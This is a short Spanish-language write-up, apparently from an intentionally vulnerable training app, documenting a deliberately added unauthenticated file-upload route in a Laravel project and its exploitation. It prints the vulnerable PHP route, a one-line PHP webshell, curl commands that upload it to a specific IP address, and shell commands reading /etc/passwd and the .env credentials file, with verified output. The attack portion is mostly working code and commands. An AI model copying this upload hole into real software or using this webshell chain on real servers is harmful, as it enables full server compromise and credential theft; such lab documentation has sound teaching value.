# 04 - File Upload / RCE

**Responsable:** Alex
**Tipo:** File Upload + Remote Code Execution (A03:2021 - Injection)

## Archivo modificado
`routes/web.php` (líneas 93-103)

## Cambio realizado
Se agregó una ruta POST `/upload` **sin autenticación** y **sin validación de tipo de archivo**:

```php
// 🔥 VULNERABLE - Sin auth, sin validación:
Route::post('/upload', function (Illuminate\Http\Request $request) {
    $request->validate(['file' => ['required', 'file']]);
    $file = $request->file('file');
    $name = $file->getClientOriginalName();
    $uploadPath = public_path('uploads');
    if (!file_exists($uploadPath)) {
        mkdir($uploadPath, 0755, true);
    }
    $file->move($uploadPath, $name);
    return response()->json(['success' => true, 'path' => '/uploads/' . $name]);
});
```

## Explotación

### Paso 1: Crear webshell
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

### Paso 2: Obtener CSRF y subir webshell
```bash
TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
curl -s -X POST "http://37.60.230.11/upload" \
  -b cookies.txt \
  -F "_token=$TOKEN" \
  -F "file=@/tmp/shell.php"
```

### Paso 3: Ejecutar comandos
```bash
# Información del sistema
curl "http://37.60.230.11/uploads/shell.php?cmd=id"
curl "http://37.60.230.11/uploads/shell.php?cmd=whoami"
curl "http://37.60.230.11/uploads/shell.php?cmd=uname+-a"

# Exploración
curl "http://37.60.230.11/uploads/shell.php?cmd=ls+-la+/"
curl "http://37.60.230.11/uploads/shell.php?cmd=cat+/etc/passwd"

# Código fuente del proyecto
curl "http://37.60.230.11/uploads/shell.php?cmd=cat+.env"
```

## Resultado (verificado)
```
UPLOAD: HTTP 200 → {"success":true,"path":"/uploads/shell.php"}
$ id     → uid=82(www-data) gid=82(www-data)
$ whoami → www-data
```

## Impacto
- **Compromiso total del servidor web**
- Acceso a variables de entorno (`.env` contiene credenciales de BD)
- Potencial pivoting hacia la base de datos PostgreSQL
- Posible reverse shell para acceso persistente
